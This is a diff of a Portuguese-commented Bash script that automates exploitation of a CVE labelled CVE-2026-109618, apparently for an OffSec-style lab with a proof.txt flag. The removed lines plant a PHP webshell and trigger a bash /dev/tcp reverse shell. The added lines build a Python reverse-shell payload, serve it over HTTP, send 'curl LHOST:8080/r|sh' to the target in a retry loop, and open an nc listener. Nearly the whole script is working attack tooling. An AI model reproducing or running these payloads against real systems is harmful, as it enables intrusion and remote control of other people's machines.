@@ -1,93 +1,182 @@
 #!/bin/bash
-# run_shell.sh — Planta webshell via CVE-2026-109618 e abre reverse shell
+# run_shell.sh — CVE-2026-109618 → Reverse Shell automatizado
 #
 # Uso:
-#   Terminal 1 (listener):  nc -lvnp 4444
-#   Terminal 2 (exploit):   ./run_shell.sh
+#   ./run_shell.sh                    → usa $IP ou 192.168.127.10
+#   ./run_shell.sh <target> [porta]   → target e porta específicos
+#
+# Requisitos: exploit-orig.py no mesmo diretório, python3, nc
+#
+# O script faz tudo sozinho:
+#   1. Detecta o IP do Kali
+#   2. Gera payload de reverse shell com retry
+#   3. Sobe HTTP server para servir o payload
+#   4. Roda o exploit em loop até ter sucesso (detecta via log do HTTP)
+#   5. Abre nc interativo — o shell aparece no terminal
 
 set -u
 
-HOST="${1:-${IP:-192.168.107.10}}"
-PORT="${2:-80}"
-BASE="http://$HOST:$PORT"
+TARGET="${1:-${IP:-192.168.127.10}}"
+TPORT="${2:-80}"
 LPORT=4444
+SPORT=8080
+MAX_ATTEMPTS=15
 
-RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
+SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
+EXPLOIT="$SCRIPT_DIR/exploit-orig.py"
 
-# Detecta IP do Kali (tun0 = VPN OffSec)
+RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
+CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'
+
+# ─── Verificações ────────────────────────────────────────────
+if [ ! -f "$EXPLOIT" ]; then
+    echo -e "${RED}[!] exploit-orig.py não encontrado em $SCRIPT_DIR${NC}"
+    exit 1
+fi
+
+if ! command -v nc &>/dev/null; then
+    echo -e "${RED}[!] nc (netcat) não instalado${NC}"
+    exit 1
+fi
+
+# ─── Detecta IP do Kali ─────────────────────────────────────
 LHOST=$(ip -4 addr show tun0 2>/dev/null | grep -oP 'inet \K[\d.]+' || \
         ip -4 addr show eth0 2>/dev/null | grep -oP 'inet \K[\d.]+' || \
-        echo "KALI_IP")
+        echo "")
 
-echo -e "${CYAN}═══════════════════════════════════════════════${NC}"
-echo -e "${CYAN}  CVE-2026-109618 → Webshell → Reverse Shell${NC}"
-echo -e "${CYAN}═══════════════════════════════════════════════${NC}"
+if [ -z "$LHOST" ]; then
+    echo -e "${RED}[!] Não consegui detectar IP do Kali (tun0/eth0)${NC}"
+    exit 1
+fi
+
+# ─── Verifica target acessível ───────────────────────────────
+echo -e "${CYAN}[*]${NC} Testando conexão com $TARGET:$TPORT..."
+if ! curl -s --max-time 5 -o /dev/null "http://$TARGET:$TPORT/"; then
+    echo -e "${RED}[!] Target $TARGET:$TPORT inacessível${NC}"
+    exit 1
+fi
+echo -e "${GREEN}[+]${NC} Target acessível"
+
+# ─── Setup temporário ────────────────────────────────────────
+TMP=$(mktemp -d)
+cleanup() {
+    kill $(jobs -p) 2>/dev/null
+    wait 2>/dev/null
+    rm -rf "$TMP"
+}
+trap cleanup EXIT
+
+# ─── Gera payload de reverse shell ───────────────────────────
+# O payload tenta conectar 10x com intervalo de 1s.
+# Assim o nc tem tempo de subir entre a detecção e a conexão.
+cat > "$TMP/r" << PAYLOAD
+python3 -c "
+import socket,subprocess,os,time
+for _ in range(10):
+ try:
+  s=socket.socket();s.connect(('$LHOST',$LPORT))
+  os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
+  subprocess.call(['/bin/sh','-i']);break
+ except:time.sleep(1)
+"
+PAYLOAD
+
+# ─── Sobe HTTP server (silencioso, com log) ──────────────────
+(cd "$TMP" && python3 -m http.server "$SPORT") > "$TMP/http.log" 2>&1 &
+HTTP_PID=$!
+sleep 1
+
+if ! kill -0 "$HTTP_PID" 2>/dev/null; then
+    echo -e "${RED}[!] Falha ao subir HTTP server na porta $SPORT${NC}"
+    exit 1
+fi
+
+# ─── Banner ──────────────────────────────────────────────────
+RCE_CMD="curl $LHOST:$SPORT/r|sh"
+RCE_LEN=${#RCE_CMD}
+
 echo ""
-echo "  Target:   $HOST:$PORT"
-echo "  Callback: $LHOST:$LPORT"
+echo -e "${CYAN}════════════════════════════════════════════════${NC}"
+echo -e "${CYAN}  CVE-2026-109618 → Reverse Shell${NC}"
+echo -e "${CYAN}════════════════════════════════════════════════${NC}"
+echo ""
+echo -e "  Target:    ${BOLD}$TARGET:$TPORT${NC}"
+echo -e "  Callback:  ${BOLD}$LHOST:$LPORT${NC}"
+echo -e "  Payload:   ${BOLD}$RCE_CMD${NC} ($RCE_LEN bytes / 48 max)"
 echo ""
 
-# ─── STEP 1: Verificar se webshell já existe ───
-echo -e "${YELLOW}[1/3]${NC} Verificando se webshell já existe..."
-WS_CHECK=$(curl -s --max-time 5 "$BASE/s.php?c=id" 2>/dev/null)
-if echo "$WS_CHECK" | grep -q "uid="; then
-    echo -e "${GREEN}[OK]${NC} Webshell já está ativo!"
-    echo "  $WS_CHECK"
-else
-    # ─── STEP 2: Plantar webshell via exploit ───
-    echo -e "${YELLOW}[2/3]${NC} Plantando webshell via exploit-orig.py..."
-    echo "  Comando: echo '<?=\`\$_GET[c]\`;'>/var/www/html/s.php (41 bytes)"
-    echo ""
+if [ "$RCE_LEN" -gt 48 ]; then
+    echo -e "${RED}[!] Payload excede 48 bytes! Ajuste IP/porta.${NC}"
+    exit 1
+fi
 
-    for ATTEMPT in $(seq 1 10); do
-        echo -e "${YELLOW}  Tentativa $ATTEMPT/10...${NC}"
+# ─── Exploit loop com detecção automática ────────────────────
+echo -e "${YELLOW}[*]${NC} Rodando exploit (até $MAX_ATTEMPTS tentativas)..."
+echo ""
 
-        python3 exploit-orig.py \
-          --host "$HOST" \
-          --port "$PORT" \
-          --rce "echo '<?=\`\$_GET[c]\`;'>/var/www/html/s.php"
+SUCCESS=0
+for i in $(seq 1 $MAX_ATTEMPTS); do
+    printf "  [%2d/%d] " "$i" "$MAX_ATTEMPTS"
 
-        sleep 2
+    python3 "$EXPLOIT" \
+        --host "$TARGET" --port "$TPORT" \
+        --rce "$RCE_CMD" \
+        &> "$TMP/exploit_$i.log"
 
-        WS_CHECK=$(curl -s --max-time 5 "$BASE/s.php?c=id" 2>/dev/null)
-        if echo "$WS_CHECK" | grep -q "uid="; then
-            echo -e "${GREEN}[OK]${NC} Webshell plantado!"
-            echo "  $WS_CHECK"
+    # Verifica se o HTTP server recebeu GET /r (= target baixou o payload)
+    if grep -q "GET /r" "$TMP/http.log" 2>/dev/null; then
+        echo -e "${GREEN}EXPLOIT DEU CERTO!${NC}"
+        SUCCESS=1
+        break
+    fi
+
+    # Feedback baseado na saída do exploit
+    LAST=$(tail -1 "$TMP/exploit_$i.log" 2>/dev/null)
+    if echo "$LAST" | grep -q "normal-size cookie"; then
+        echo -e "leak falhou ${YELLOW}(cookie normal)${NC}"
+    elif echo "$LAST" | grep -q "RuntimeError\|Traceback"; then
+        echo -e "${RED}erro (target se recuperando)${NC}"
+    elif echo "$LAST" | grep -q "response=0"; then
+        echo "RCE enviado, verificando..."
+        sleep 3
+        if grep -q "GET /r" "$TMP/http.log" 2>/dev/null; then
+            echo -e "  ${GREEN}EXPLOIT DEU CERTO!${NC}"
+            SUCCESS=1
             break
         fi
-    done
-
-    if ! echo "$WS_CHECK" | grep -q "uid="; then
-        echo -e "${RED}[FAIL]${NC} Não consegui plantar o webshell."
-        exit 1
+    elif echo "$LAST" | grep -q "candidates=0"; then
+        echo -e "leak falhou ${YELLOW}(sem candidates)${NC}"
+    else
+        echo "sem sucesso"
     fi
+
+    sleep 2
+done
+
+if [ $SUCCESS -eq 0 ]; then
+    echo ""
+    echo -e "${RED}[-] $MAX_ATTEMPTS tentativas esgotadas.${NC}"
+    echo "    Verifique: curl http://$TARGET:$TPORT/"
+    echo "    O target pode precisar de reinício."
+    exit 1
 fi
 
+# ─── Reverse shell conectando ────────────────────────────────
 echo ""
-echo -e "${GREEN}═══════════════════════════════════════════════${NC}"
-echo -e "${GREEN}  WEBSHELL ATIVO: $BASE/s.php?c=COMANDO${NC}"
-echo -e "${GREEN}═══════════════════════════════════════════════${NC}"
+echo -e "${GREEN}════════════════════════════════════════════════${NC}"
+echo -e "${GREEN}  REVERSE SHELL CONECTANDO...${NC}"
+echo -e "${GREEN}════════════════════════════════════════════════${NC}"
 echo ""
-echo "  Exemplos:"
-echo "    curl '$BASE/s.php?c=id'"
-echo "    curl '$BASE/s.php?c=whoami'"
-echo "    curl '$BASE/s.php?c=cat+/etc/passwd'"
-echo "    curl '$BASE/s.php?c=ls+-la+/var/www/'"
-echo ""
-
-# ─── STEP 3: Reverse shell ───
-echo -e "${YELLOW}[3/3]${NC} Para abrir reverse shell:"
-echo ""
-echo -e "${CYAN}  Terminal 1 (listener):${NC}"
-echo "    nc -lvnp $LPORT"
-echo ""
-echo -e "${CYAN}  Terminal 2 (trigger):${NC}"
-echo "    curl '$BASE/s.php?c=bash+-c+bash%20-i%20%3E%26%20/dev/tcp/$LHOST/$LPORT%200%3E%261'"
+echo -e "  Comandos úteis:"
+echo -e "    ${BOLD}whoami${NC}                   → usuário no target"
+echo -e "    ${BOLD}id${NC}                       → uid/gid"
+echo -e "    ${BOLD}hostname${NC}                 → nome do servidor"
+echo -e "    ${BOLD}cat /var/www/proof.txt${NC}   → flag"
+echo -e "    ${BOLD}uname -a${NC}                 → kernel"
 echo ""
 
-read -p "Abrir reverse shell agora? (Certifique-se de que nc -lvnp $LPORT está rodando!) [s/N] " RESP
-if [[ "$RESP" =~ ^[sS]$ ]]; then
-    echo "[*] Disparando reverse shell para $LHOST:$LPORT..."
-    curl -s --max-time 5 "$BASE/s.php?c=bash+-c+bash%20-i%20%3E%26%20/dev/tcp/$LHOST/$LPORT%200%3E%261" &
-    echo -e "${GREEN}[*] Verifique o terminal do netcat!${NC}"
-fi
+# nc listener em foreground — interativo
+nc -lvnp $LPORT
+
+echo ""
+echo -e "${CYAN}[*]${NC} Shell encerrado."
